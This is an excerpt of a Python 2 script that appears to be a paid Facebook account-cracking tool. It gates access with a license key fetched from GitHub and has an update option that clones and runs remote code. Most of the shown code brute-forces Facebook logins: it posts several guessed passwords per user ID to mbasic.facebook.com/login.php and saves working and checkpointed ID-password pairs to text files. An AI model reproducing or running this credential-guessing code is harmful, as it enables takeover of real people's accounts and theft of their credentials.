...
def main_apv():
    ...
    try:
        ...
        print '           Hello Dear Sir This Tools Is Paid'
        print '           You Need To Approval'
        print '           Send Key To ADMIN Thanks'
        print '           For Send Key Prees Click'
        ...
        print '           Copy Your Key And Send To Admin'
        print ''
        print ''
        print ''
    ...
    r1 = requests.get('https://raw.githubusercontent.com/AfghanHack001/new-random/main/public.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        ...
        print '         YOUR KEY : ' + key1
        print ''
        print '           Copy Your Key Send To Admin'
...
def main_input():
    ...
    if mx == '1':
        ...
        print ''
        print ''
        print '\x1b[1;92m        Congratulations Bro Your Key Approved'
        print '\x1b[1;92m        Member In Black Paid Commands '
        print '\x1b[1;91m        ENJOY  KRO BHI LOGO '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('rm -rf PAID')
        os.system('git clone https://github.com/AfghanHack001/new-random')
        os.system('cp -f new-random/new-random \\.')
        os.system('rm -rf new-random')
        os.system(' cd new-random')
        os.system(' python2 new-random.py')
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[BLACK-OK] ' + coc + user + ' | ' + pass1
                ok = open('black random-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[BLACK-CP] ' + coc + user + ' | ' + pass1
                cp = open('black random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From BLACK : ' + my_line[:15]
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[BLACK-OK] ' + uid + ' | ' + pass1
                ok = open('BLACK-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[BLACK-CP] ' + uid + ' | ' + pass1
                cp = open('BLACK-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[BLACK-OK] ' + uid + ' | ' + pass2
                    ok = open('BLACK-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[BLACK-CP] ' + uid + ' | ' + pass2
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[BLACK-OK] ' + uid + ' | ' + pass3
                        ok = open('BLACK-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[BLACK-CP] ' + uid + ' | ' + pass3
                        cp = open('BLACK-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[BLACK-OK] ' + uid + ' | ' + pass4
                            ok = open('BLACK-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[BLACK-CP] ' + uid + ' | ' + pass4
                            cp = open('BLACK-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[BLACK-OK] ' + uid + ' | ' + pass5
                                ok = open('BLACK-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[BLACK-CP] ' + uid + ' | ' + pass5
                                cp = open('BLACK-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;91m[BLACL-CP] ' + uid + ' | ' + pass2
                    cp = open('BLACK-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[BLACL-OK] ' + uid + ' | ' + pass2
                    ok = open('BLACK-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
